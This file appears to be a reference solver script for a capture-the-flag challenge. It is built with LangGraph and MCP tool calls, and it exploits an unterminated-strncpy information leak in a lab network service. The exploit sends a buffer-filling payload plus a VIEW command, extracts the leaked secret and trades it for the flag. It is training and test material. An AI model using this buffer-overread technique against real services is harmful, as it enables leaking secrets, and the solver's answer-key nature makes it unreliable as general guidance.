"""
Reference solver for the Baby PWN (Information Leak) challenge.

The vulnerable binary leaks a random secret (not the flag itself).
After extracting the secret, the solver calls the get_flag MCP tool
with the secret to obtain the real flag.

Orchestrated with LangGraph; uses the LiteLLM proxy (OpenAI-compatible API)
for optional LLM-assisted vulnerability analysis.
"""
from __future__ import annotations

import json
import os
import re
import socket
import time
from typing import Any

import requests  # type: ignore[import-not-found]
from langgraph.graph import END, START, StateGraph  # type: ignore[import-not-found]
from typing_extensions import NotRequired, TypedDict


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _env(name: str, default: str | None = None) -> str:
    v = os.environ.get(name)
    if v is None or v == "":
        if default is None:
            raise RuntimeError(f"Missing required env var: {name}")
        return default
    return v


def _clean_env_value(v: str) -> str:
    return v.split("#", 1)[0].strip()


def jsonrpc(url: str, method: str, params: dict[str, Any] | None = None, _id: int = 1) -> dict[str, Any]:
    payload: dict[str, Any] = {"jsonrpc": "2.0", "id": _id, "method": method}
    if params is not None:
        payload["params"] = params
    resp = requests.post(url, json=payload, timeout=15)
    resp.raise_for_status()
    data = resp.json()
    if "error" in data:
        raise RuntimeError(f"JSON-RPC error: {data['error']}")
    return data


def openai_chat_completion(base_url: str, api_key: str | None, model: str, prompt: str) -> str:
    """Call the LiteLLM proxy's OpenAI-compatible chat endpoint."""
    url = base_url.rstrip("/") + "/v1/chat/completions"
    headers: dict[str, str] = {"Content-Type": "application/json"}
    if api_key:
        headers["Authorization"] = f"Bearer {api_key}"
    payload = {
        "model": model,
        "messages": [
            {
                "role": "system",
                "content": (
                    "You are a PWN challenge solver. "
                    "Given a vulnerable C program source code and exploit parameters, "
                    "determine the exact exploit steps needed."
                ),
            },
            {"role": "user", "content": prompt},
        ],
        "response_format": {"type": "json_object"},
    }
    resp = requests.post(url, headers=headers, json=payload, timeout=45)
    resp.raise_for_status()
    data = resp.json()
    return data["choices"][0]["message"]["content"]


# ---------------------------------------------------------------------------
# Source code analysis (regex-based, LLM-enhanced fallback)
# ---------------------------------------------------------------------------

def analyze_source(source: str) -> dict[str, Any]:
    """Extract vulnerability parameters from C source code."""
    result: dict[str, Any] = {
        "buffer_size": 64,
        "num_interactions": 3,
        "vuln_interaction": 1,
        "user_buffer_name": "user_data",
        "secret_buffer_name": "secret_data",
    }

    # Find struct with adjacent buffers
    struct_match = re.search(r"struct\s+\w+\s*\{([^}]+)\}", source)
    if struct_match:
        buf_matches = re.findall(r"char\s+(\w+)\[(\d+)\]", struct_match.group(1))
        if len(buf_matches) >= 2:
            result["user_buffer_name"] = buf_matches[0][0]
            result["buffer_size"] = int(buf_matches[0][1])
            result["secret_buffer_name"] = buf_matches[1][0]

    # Count interactions: "N. Enter" pattern
    interaction_matches = re.findall(r'printf\s*\(\s*"(\d+)\.\s*Enter\s+[^"]+:', source)
    if interaction_matches:
        result["num_interactions"] = len(interaction_matches)
    else:
        # "Step N/M" pattern
        step_matches = re.findall(r"Step\s+(\d+)/(\d+)", source)
        if step_matches:
            result["num_interactions"] = max(int(m) for _, m in step_matches)
        else:
            fgets_count = len(re.findall(r"fgets\s*\([^)]+stdin\)", source))
            result["num_interactions"] = max(3, fgets_count - 1)

    # Find which interaction has the strncpy vulnerability
    strncpy_match = re.search(r"strncpy\s*\(\s*(?:storage\.)?\w+\s*,\s*[^,]+\s*,\s*(\d+)\)", source)
    if strncpy_match:
        pre = source[: source.find("strncpy")]
        nums = re.findall(r'printf\s*\(\s*"(\d+)\.', pre)
        if not nums:
            nums = re.findall(r"Step\s+(\d+)/\d+", pre)
        if nums:
            result["vuln_interaction"] = int(nums[-1])
        else:
            result["vuln_interaction"] = max(1, result["num_interactions"] // 2)

    return result


def try_llm_analysis(source: str) -> dict[str, Any] | None:
    """Optionally use LLM to verify/enhance analysis."""
    base_url = _clean_env_value(os.environ.get("LITELLM_BASE_URL") or "")
    if not base_url:
        return None
    api_key_raw = os.environ.get("TEAM_LITELLM_API_KEY") or ""
    api_key = _clean_env_value(api_key_raw) or None
    model = _clean_env_value(
        os.environ.get("TEAM_LITELLM_MODEL")
        or os.environ.get("LITELLM_MODEL")
        or "gpt-4o-mini"
    )

    prompt = (
        "Analyze this vulnerable C program and return STRICT JSON with keys:\n"
        '  buffer_size (int), num_interactions (int), vuln_interaction (int)\n\n'
        f"Source code:\n{source}"
    )
    try:
        content = openai_chat_completion(base_url, api_key, model, prompt)
        obj = json.loads(content)
        return {
            "buffer_size": int(obj.get("buffer_size", 0)),
            "num_interactions": int(obj.get("num_interactions", 0)),
            "vuln_interaction": int(obj.get("vuln_interaction", 0)),
        }
    except Exception as e:
        print(f"[solve] LLM analysis failed: {e!r}")
        return None


# ---------------------------------------------------------------------------
# Exploit execution (raw sockets, no pwntools dependency)
# ---------------------------------------------------------------------------

def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    """Receive from socket until marker is found or timeout."""
    sock.settimeout(timeout)
    buf = b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            if marker in buf:
                break
        except socket.timeout:
            break
    return buf


def recv_all(sock: socket.socket, timeout: float = 3.0) -> bytes:
    """Receive all available data from socket."""
    sock.settimeout(timeout)
    buf = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
        except socket.timeout:
            break
    return buf


def run_exploit(host: str, port: int, buffer_size: int,
                num_interactions: int, vuln_interaction: int) -> str | None:
    """Connect to the vulnerable service and exploit the information leak.

    Returns the leaked secret string (babypwn_...), NOT the flag itself.
    """
    print(f"[exploit] Connecting to {host}:{port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)

    try:
        sock.connect((host, port))

        # Receive banner / welcome
        banner = recv_until(sock, b":", timeout=5)
        print(f"[exploit] Banner: {banner.decode('utf-8', errors='ignore').strip()[:120]}")

        for i in range(1, num_interactions + 1):
            if i == vuln_interaction:
                payload = b"B" * buffer_size + b"\n"
                sock.sendall(payload)
                print(f"[exploit] Interaction {i}/{num_interactions}: sent {buffer_size} bytes (vulnerable)")
            else:
                sock.sendall(b"test\n")
                print(f"[exploit] Interaction {i}/{num_interactions}: sent normal input")

            recv_until(sock, b":", timeout=3)

        # Send VIEW command to trigger the leak
        print("[exploit] Sending VIEW command")
        sock.sendall(b"VIEW\n")

        response = recv_all(sock, timeout=5)
        response_str = response.decode("utf-8", errors="ignore")
        print(f"[exploit] Response:\n{response_str}")

        # Extract the leaked secret (format: babypwn_<hex>)
        secret_match = re.search(r"babypwn_[0-9a-f]+", response_str)
        if secret_match:
            return secret_match.group(0)

        # Fallback: try extracting from "Stored data:" line
        if "Stored data:" in response_str:
            stored = response_str.split("Stored data:")[1].strip().split("\n")[0]
            secret_match = re.search(r"babypwn_[0-9a-f]+", stored)
            if secret_match:
                return secret_match.group(0)
            # If no babypwn_ prefix found, the secret might be the non-B portion
            # after the B-fill bytes
            clean = stored.lstrip("B").strip()
            if clean:
                return clean

        return None

    except Exception as e:
        print(f"[exploit] Error: {e!r}")
        return None
    finally:
        sock.close()


# ---------------------------------------------------------------------------
# LangGraph state & nodes
# ---------------------------------------------------------------------------

class SolveState(TypedDict):
    source_code: NotRequired[str]
    host: NotRequired[str]
    port: NotRequired[int]
    buffer_size: NotRequired[int]
    num_interactions: NotRequired[int]
    vuln_interaction: NotRequired[int]
    secret: NotRequired[str]
    flag: NotRequired[str]
    result_text: NotRequired[str]


def node_initialize(_: SolveState) -> SolveState:
    mcp_rpc = _env("MCP_PWN_URL") + "/rpc"
    jsonrpc(mcp_rpc, "initialize", {"clientInfo": {"name": "pwn-solver", "version": "1.0"}}, _id=1)
    print("[solve] MCP initialized")
    return {}


def node_get_service_info(_: SolveState) -> SolveState:
    mcp_rpc = _env("MCP_PWN_URL") + "/rpc"
    res = jsonrpc(mcp_rpc, "tools/call", {"name": "get_service_info", "arguments": {}}, _id=2)
    text = res["result"]["content"][0]["text"]
    print(f"[solve] Service info:\n{text}")

    host_match = re.search(r"Host:\s*(\S+)", text)
    port_match = re.search(r"Port:\s*(\d+)", text)

    host = host_match.group(1) if host_match else _env("VULN_SERVICE_HOST", "pwn_service")
    port = int(port_match.group(1)) if port_match else int(_env("VULN_SERVICE_PORT", "9000"))

    print(f"[solve] Target: {host}:{port}")
    return {"host": host, "port": port}


def node_get_source_code(_: SolveState) -> SolveState:
    mcp_rpc = _env("MCP_PWN_URL") + "/rpc"
    res = jsonrpc(mcp_rpc, "tools/call", {"name": "get_source_code", "arguments": {}}, _id=3)
    text = res["result"]["content"][0]["text"]

    # Extract just the C code between --- markers if present
    parts = text.split("---")
    source = parts[1].strip() if len(parts) >= 3 else text
    print(f"[solve] Source code obtained ({len(source)} chars)")
    return {"source_code": source}


def node_analyze(state: SolveState) -> SolveState:
    source = state.get("source_code", "")
    if not source:
        print("[solve] No source code to analyze")
        return {}

    params = analyze_source(source)
    print(f"[solve] Regex analysis: {params}")

    llm_params = try_llm_analysis(source)
    if llm_params and all(v > 0 for v in llm_params.values()):
        print(f"[solve] LLM analysis: {llm_params}")
        for k in ("buffer_size", "num_interactions", "vuln_interaction"):
            if llm_params.get(k, 0) > 0:
                params[k] = llm_params[k]

    print(
        f"[solve] Final params: buffer_size={params['buffer_size']}, "
        f"interactions={params['num_interactions']}, "
        f"vuln_interaction=#{params['vuln_interaction']}"
    )
    return {
        "buffer_size": params["buffer_size"],
        "num_interactions": params["num_interactions"],
        "vuln_interaction": params["vuln_interaction"],
    }


def node_exploit(state: SolveState) -> SolveState:
    """Exploit the information leak to extract the secret from the vulnerable service."""
    host = state.get("host", _env("VULN_SERVICE_HOST", "pwn_service"))
    port = state.get("port", int(_env("VULN_SERVICE_PORT", "9000")))
    buffer_size = state.get("buffer_size", 64)
    num_interactions = state.get("num_interactions", 3)
    vuln_interaction = state.get("vuln_interaction", 1)

    secret = run_exploit(host, port, buffer_size, num_interactions, vuln_interaction)

    if secret:
        print(f"[solve] Secret leaked: {secret}")
        return {"secret": secret}
    else:
        print("[solve] Exploit did not find the secret")
        return {"result_text": "Exploit failed to extract secret"}


def node_get_flag(state: SolveState) -> SolveState:
    """Submit the leaked secret to the get_flag MCP tool to obtain the real flag."""
    secret = state.get("secret", "")
    if not secret:
        print("[solve] No secret available, cannot get flag")
        return {"result_text": "No secret to submit"}

    mcp_rpc = _env("MCP_PWN_URL") + "/rpc"
    print(f"[solve] Submitting secret to get_flag: {secret}")
    res = jsonrpc(
        mcp_rpc,
        "tools/call",
        {"name": "get_flag", "arguments": {"secret": secret}},
        _id=10,
    )
    text = res["result"]["content"][0]["text"]
    print(f"[solve] get_flag response: {text}")

    # Extract the flag from the response
    flag_match = re.search(r"ictf\{[^}]+\}", text, re.IGNORECASE)
    if flag_match:
        flag = flag_match.group(0)
        print(flag)
        return {"flag": flag, "result_text": f"Flag: {flag}"}

    if "Correct" in text:
        print(text)
        return {"flag": text, "result_text": text}

    print(f"[solve] get_flag did not return a flag: {text}")
    return {"result_text": text}


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    graph = StateGraph(SolveState)
    graph.add_node("initialize", node_initialize)
    graph.add_node("get_service_info", node_get_service_info)
    graph.add_node("get_source_code", node_get_source_code)
    graph.add_node("analyze", node_analyze)
    graph.add_node("exploit", node_exploit)
    graph.add_node("get_flag", node_get_flag)

    graph.add_edge(START, "initialize")
    graph.add_edge("initialize", "get_service_info")
    graph.add_edge("get_service_info", "get_source_code")
    graph.add_edge("get_source_code", "analyze")
    graph.add_edge("analyze", "exploit")
    graph.add_edge("exploit", "get_flag")
    graph.add_edge("get_flag", END)

    app = graph.compile()
    result = app.invoke({"result_text": ""})

    if result.get("flag"):
        print(f"\nSUCCESS: {result['flag']}")
    else:
        print("\nFAILED: Could not obtain flag")


if __name__ == "__main__":
    main()
